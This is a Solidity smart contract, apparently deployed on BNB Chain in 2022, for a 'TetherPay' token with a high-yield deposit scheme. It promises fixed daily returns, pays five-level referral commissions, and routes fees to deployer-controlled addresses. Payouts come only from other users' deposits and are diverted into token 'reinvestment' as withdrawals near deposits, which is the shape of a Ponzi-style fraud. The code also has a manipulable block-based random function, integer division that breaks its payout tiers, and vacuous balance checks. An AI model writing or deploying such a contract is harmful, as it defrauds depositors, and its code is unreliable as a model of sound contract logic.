/**
 *Submitted for verification at BscScan.com on 2022-09-30
*/

// SPDX-License-Identifier: MIT License
pragma solidity 0.8.9;

interface IERC20 {    
	function totalSupply() external view returns (uint256);
	function decimals() external view returns (uint8);
	function symbol() external view returns (string memory);
	function name() external view returns (string memory);
	function getOwner() external view returns (address);
	function balanceOf(address account) external view returns (uint256);
	function transfer(address recipient, uint256 amount) external returns (bool);
	function allowance(address _owner, address spender) external view returns (uint256);
	function approve(address spender, uint256 amount) external returns (bool);
	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
    
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }
    
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }
    
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }
    
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            
            if (returndata.length > 0) {
                

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

library SafeERC20 {
    using Address for address;

    function safeTransfer(
        IERC20 token,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }
    
    function safeApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender) + value;
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
            uint256 newAllowance = oldAllowance - value;
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
        }
    }
    
    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
    * @dev Initializes the contract setting the deployer as the initial owner.
    */
    constructor () {
      address msgSender = _msgSender();
      _owner = msgSender;
      emit OwnershipTransferred(address(0), msgSender);
    }

    /**
    * @dev Returns the address of the current owner.
    */
    function owner() public view returns (address) {
      return _owner;
    }
    
    modifier onlyOwner() {
      require(_owner == _msgSender(), "Ownable: caller is not the owner");
      _;
    }

    function renounceOwnership() public onlyOwner {
      emit OwnershipTransferred(_owner, address(0));
      _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
      _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
      require(newOwner != address(0), "Ownable: new owner is the zero address");
      emit OwnershipTransferred(_owner, newOwner);
      _owner = newOwner;
    }
}

contract TetherPay is Context, Ownable, IERC20 {
    using SafeMath for uint256;
	
    //event DepositMade(address indexed addr, uint256 amount, uint40 tm);
    //event PayoutReleased(address indexed addr, uint256 amount);

	mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
	
    IERC20 public USDT;

    address payable public dev;
    address payable public ceo;
    address payable public mkg;

    uint8 public isScheduled;
    uint8 public isDaily;
    uint256 private constant DAY = 24 hours;
    uint256 public numDays = 1;
   
    uint16 constant PERCENT_DIVIDER = 100; 
    uint16[5] public ref_bonuses = [10, 5, 3, 2, 1]; 

    uint256 public invested;
    uint256 public reinvested;
    uint256 public withdrawn;
    uint256 public ref_bonus;
    
    struct Tarif {
        uint256 life_days;
        uint256 percent;
    }

    struct Deposit {
        uint256 tarif;
        uint256 amount;
        uint40 time;
    }

    struct Player {
        address upline;
        uint256 dividends;
        uint256 ref_bonus;  
        
        uint256 total_deposit;
        uint256 total_reinvested;
        uint256 total_withdrawn;
        uint256 total_ref_bonus;
        uint40 lastWithdrawn;
        
        Roll[] rolls;
        Deposit[] deposits;
        Downline[] downlines1;
        Downline[] downlines2;
        Downline[] downlines3;
		Downline[] downlines4;
		Downline[] downlines5;		
        uint256[5] structure; 
    }
	
	struct Roll {
        uint40 timeRolled;
        uint256 rewards;		
        uint256 result;
    }

    struct Downline {
        uint8 level;   
        uint256 deposit; 
        address invite;
    }

    mapping(address => Player) public players;
    mapping(uint256 => Tarif) public tarifs;
    
    uint public nextMemberNo;

    uint256 sellRate = 100000;
    uint256 airDropRate = 10000;
    
    constructor() {		
        _name = "TetherPay Token";
        _symbol = "TP";
        _decimals = 18;
        _totalSupply =  10_000_000_000 * 10**uint(_decimals); // 10B

        _balances[address(this)] = 5_000_000_000 * 10**uint(_decimals); 
		emit Transfer(address(0), address(this), _balances[address(this)]);    
		
        _balances[msg.sender] = 5_000_000_000 * 10**uint(_decimals); 
		emit Transfer(address(0), msg.sender, _balances[msg.sender]);    
		
        tarifs[72] = Tarif(72, 216); //3% daily for 72 days     
        tarifs[100] = Tarif(100, 180); //1.8% daily for 100 days     

        dev = payable(msg.sender);		
	    ceo = payable(msg.sender);		
        mkg = payable(msg.sender);	

        USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);		
    }

    
    //function Partake(address _upline, uint256 amount) external {
    //    require(msg.value >= 10 ether, "Minimum Deposit is 10 USDT!");
    function Partake(address referral) public payable {
        require(msg.value >= 0.03 ether, "Minimum Buy is 0.03 BNB");

        //USDT.safeTransferFrom(msg.sender, address(this), amount);

        //setUpline(msg.sender, referral, amount);
        setUpline(msg.sender, referral, msg.value);

        Player storage player = players[msg.sender];
       
        player.deposits.push(Deposit({
            tarif: 72,
            amount: msg.value,
            //amount: amount,
            time: uint40(block.timestamp)
        }));  
        //emit DepositMade(msg.sender, amount, uint40(block.timestamp));
        //emit DepositMade(msg.sender, msg.value, uint40(block.timestamp));

        player.total_deposit += msg.value;        
        invested += msg.value;

        //teamSupport(dev,amount,3);
        ////teamSupport(ceo,amount,2);
        
        teamSupport(dev,msg.value,5);
        //teamSupport(ceo,msg.value,2);

        //commissionPayouts(msg.sender, amount);		
        commissionPayouts(msg.sender, msg.value);
    }
   

    function Claim() external {      
        Player storage player = players[msg.sender];

        if(isScheduled == 1) {
            require (block.timestamp >= (player.lastWithdrawn + (DAY * numDays)), "Not due yet for next payout!");
        }     

        getPayout(msg.sender);

        require(player.dividends + player.ref_bonus > 0, "No Income Yet!");

        uint256 amount =  player.dividends + player.ref_bonus;
        uint256 maxAmount = SafeMath.div(player.total_deposit - player.total_reinvested,10);   

        player.dividends = 0;
        player.ref_bonus = 0;

        if(amount > maxAmount){
            player.dividends = amount - maxAmount;
            amount = maxAmount;
        }   

        uint256 t = SafeMath.div(withdrawn, invested) * 100;
        uint256 reinvest;
        uint256 payout;
        uint256 tokens;

        if(t >= 90)
        {
            //reinvest all
            reinvest = amount;
            tokens = amount.mul(airDropRate);
            
        }else if(t >= 80)
        {
            tokens = _balances[msg.sender];
            if(tokens > 0){
                payout = tokens.div(sellRate); 
                if(payout * 4 <= amount){                    
                    transferTokens(msg.sender, address(this), tokens);
                }else{
                    payout = 0;
                }                
                player.dividends = player.dividends + amount - payout;

            }else{
                reinvest = amount;
                tokens = amount.mul(airDropRate); 
            }

        }else if(t >= 70)
        {  reinvest = amount * 70 / PERCENT_DIVIDER;
            payout = amount * 30 / PERCENT_DIVIDER;
            tokens = reinvest.mul(airDropRate);
        }else if(t >= 60)
        {   reinvest = amount * 60 / PERCENT_DIVIDER;
            payout = amount * 40 / PERCENT_DIVIDER;
            tokens = reinvest.mul(airDropRate);
        }else{           
            payout = amount;
        }
    	
        if(tokens > 0 && _balances[address(this)].sub(tokens) >= 0){        
            transferTokens(address(this), msg.sender, tokens);
        }

        player.total_withdrawn += amount;
        withdrawn += amount;           
        if(payout > 0){
		
            //USDT.safeTransfer(msg.sender, payout);
            payable(msg.sender).transfer(payout); 			
			
            teamSupport(dev,payout,1);
            teamSupport(ceo,payout,2);
            teamSupport(mkg,payout,2);

            //emit PayoutReleased(msg.sender, amount);        
        }

		if(reinvest > 0) {
            player.deposits.push(Deposit({
                tarif: 100,
                amount: reinvest,
                time: uint40(block.timestamp)
            }));  
            
            player.total_deposit += reinvest;
            player.total_reinvested += reinvest;
            invested += reinvest;
            reinvested += reinvest;
        }

    }

     

    function ReInvest() external {      
        Player storage player = players[msg.sender];

        getPayout(msg.sender);

        require(player.dividends + player.ref_bonus > 0, "No Income Yet!");

        uint256 amount =  player.dividends + player.ref_bonus;
        player.dividends = 0;
        player.ref_bonus = 0;
		
        player.total_withdrawn += amount;
        withdrawn += amount; 
		
        player.deposits.push(Deposit({
            tarif: 100,
            amount: amount,
            time: uint40(block.timestamp)
        }));  
        //emit _Invest(msg.sender, amount, uint40(block.timestamp), t);
	    uint256 tokens = amount.mul(airDropRate); 
        if(tokens > 0 && _balances[address(this)].sub(tokens) >= 0){        
            transferTokens(address(this), msg.sender, tokens);
        }

        player.total_deposit += amount;
        player.total_reinvested += amount;
        
        invested += amount;
		reinvested += amount;    	
    }
	

    function startGame() external {
        uint256 dice = uint8(rand(10000));
		uint256 tokens;
			
		if(dice > 6000){			
			tokens = 100 ether;
			require(_balances[address(this)].sub(tokens) >= 0);        
			transferTokens(address(this), msg.sender, tokens);
		}		
		Player storage player = players[msg.sender];		
		player.rolls.push(Roll({
            timeRolled: uint40(block.timestamp),
            rewards: tokens,
			result: dice
		}));
	}
	

	function rand(uint256 max) public view returns(uint256)
    {
        uint256 seed = uint256(keccak256(abi.encodePacked(
            block.timestamp + block.difficulty +
            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (block.timestamp)) +
            block.gaslimit + 
            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (block.timestamp)) +
            block.number
        )));
        return (seed - ((seed / max) * max));
    }
	    


    function userInfo(address _addr) view external returns(uint256 for_withdraw,                                                           
																		uint256 numDeposits,  
                                                                            uint256 downlines1,
                                                                                uint256 downlines2,
                                                                                    uint256 downlines3,
																						uint256 downlines4,
																							uint256 downlines5,
																			uint256[5] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.computePayout(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.ref_bonus,
            player.deposits.length,
            player.downlines1.length,
            player.downlines2.length,
            player.downlines3.length,
			player.downlines4.length,
			player.downlines5.length,
            structure
        );
    } 
    
    function memberDownline(address _addr, uint8 level, uint256 index) view external returns(address downline)
    {
        Player storage player = players[_addr];
        Downline storage dl;
        if(level==1){
            dl  = player.downlines1[index];
        }else if(level == 2)
        {
            dl  = player.downlines2[index];
        }else if(level == 3)
        {
            dl  = player.downlines3[index];
        }else if(level == 4)
        {
            dl  = player.downlines4[index];
        }        else{
            dl  = player.downlines5[index];
        }
        return(dl.invite);
    }


    function memberDeposit(address _addr, uint256 index) view external returns(uint40 time, uint256 amount, uint256 lifedays, uint256 percent)
    {
        Player storage player = players[_addr];
        Deposit storage dep = player.deposits[index];
        Tarif storage tarif = tarifs[dep.tarif];
        return(dep.time, dep.amount, tarif.life_days, tarif.percent);
    }
    
	function memberRoll(address _addr, uint256 index)view external returns(uint40 timeRolled, uint256 myrewards, uint256 result)
    {
        Player storage player = players[_addr];
        Roll storage roll = player.rolls[index];
        return(roll.timeRolled, roll.rewards, roll.result);
    }   
    
   	function playerLevel(address _addr) view external returns(uint256 level) {
		Player storage player = players[_addr];
        
		uint256 points1 = (player.total_deposit - player.total_reinvested) / 0.2 ether;
		//uint256 points1 = (player.total_deposit - player.total_reinvested) / 2000 ether;
		
		uint256 points2 = player.total_reinvested / 0.2 ether;
		//uint256 points2 = player.total_reinvested / 2000 ether;
		
		uint256 sum;		
		for(uint8 i = 0; i < player.downlines1.length; i++) {
			sum += player.downlines1[i].deposit;
		}
		
		uint256 points3;
		//if(sum >= 0.2 ether)
		if(sum >= 2000 ether)
		{
			points3 = player.downlines1.length/20;			
		}
		
		if(points1 > 5) { points1 = 5; }
		if(points2 > 5) { points2 = 5; }
		if(points3 > 5) { points3 = 5; }
		if(points1+points2+points3 > 10){
			return 10;
		}else{
			return (points1+points2+points3);	
		}
	}

	
    function computePayout(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];
        uint256 levelno = this.playerLevel(_addr);
        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.lastWithdrawn > dep.time ? player.lastWithdrawn : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : block.timestamp;

            if(from < to) {
                value += dep.amount * (to - from) * ((tarif.percent / tarif.life_days) + levelno) / 8640000;	
			}
        }
        return value;
    }

 
    function getPayout(address _addr) private {
        uint256 payout = this.computePayout(_addr);

        if(payout > 0) {
            players[_addr].lastWithdrawn = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }
      

    function nextWithdraw(address _addr) view external returns(uint40 next_sked) {
        Player storage player = players[_addr];
        if(player.deposits.length > 0)
        {
          return uint40(player.lastWithdrawn + (DAY * numDays));
        }
        return 0;
    }

    function transferTokens(address _from, address _to, uint256 amount) private {
        _balances[_to] = _balances[_to].add(amount);
        _balances[_from] = _balances[_from].sub(amount);
        emit Transfer(_from, _to, amount);
    }

    function redeemTokens(uint256 amount) external {       
        Player storage player = players[msg.sender];    
        require(_balances[msg.sender] - amount >= 0,"Not enough tokens!");

        _balances[msg.sender] = _balances[msg.sender].sub(amount);
        _balances[address(this)] = _balances[address(this)].add(amount);
        emit Transfer(msg.sender, address(this), amount);
        
        uint256 usdt = amount.div(sellRate); 
        //USDT.safeTransfer(msg.sender, usdt);
		payable(msg.sender).transfer(usdt); 
        withdrawn += usdt;
        player.total_withdrawn += usdt;
    }
    

    function setUpline(address _addr, address _upline, uint256 amt) private {
        if(players[_addr].upline == address(0) && _addr != owner()) {     

            if(players[_upline].total_deposit <= 0) {
				_upline = owner();
            }			
			nextMemberNo++;           			
            players[_addr].upline = _upline;
            
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;
				Player storage up = players[_upline];
                if(i == 0){
                    up.downlines1.push(Downline({
                        level: i+1,
                        invite: _addr,
                        deposit: amt
                    }));  
                }else if(i == 1){
                    up.downlines2.push(Downline({
                        level: i+1,
                        invite: _addr,
                        deposit: amt
                    }));  
                }else if(i == 2){
                    up.downlines3.push(Downline({
                        level: i+1,
                        invite: _addr,
                        deposit: amt
                    }));  
                }else if(i == 3){
                    up.downlines4.push(Downline({
                        level: i+1,
                        invite: _addr,
                        deposit: amt
                    }));  
                }
                else{
                    up.downlines5.push(Downline({
                        level: i+1,
                        invite: _addr,
                        deposit: amt
                    }));      
                }
                _upline = players[_upline].upline;
                if(_upline == address(0)) break;
            }
        }
    }   
	      
    
    function commissionPayouts(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
			
			if(i == 0){
				//USDT.safeTransfer(up, bonus);
                payable(up).transfer(bonus); 
				withdrawn += bonus;
			}else{
				 players[up].ref_bonus += bonus;
			}
			
			players[up].total_ref_bonus += bonus;
            ref_bonus += bonus;
                 
            up = players[up].upline;
        }
    }

  
    function teamSupport(address _addr, uint256 amount, uint256 perc) private {
        uint256 support = SafeMath.div(SafeMath.mul(amount, perc), 100);
        
        //USDT.safeTransfer(_addr, support);
        payable(_addr).transfer(support); 
        
        withdrawn += support;          
    }

    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }

    
    function setDev(address newval) public onlyOwner returns (bool success) {
        dev = payable(newval);
        return true;
    }
    
    function setCEO(address newval) public onlyOwner returns (bool success) {
        ceo = payable(newval);
        return true;
    }

    function setMkg(address newval) public onlyOwner returns (bool success) {
        mkg = payable(newval);
        return true;
    }

    function setScheduled(uint8 newval) public onlyOwner returns (bool success) {
        isScheduled = newval;
        return true;
    }   
   
    function setDays(uint newval) public onlyOwner returns (bool success) {
        numDays = newval;
        return true;
    }
   
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function decimals() external view returns (uint8) {
        return _decimals;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
        return true;
    }

    function burn(uint256 amount) public returns (bool) {
        _burn(_msgSender(), amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
    }

}


library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}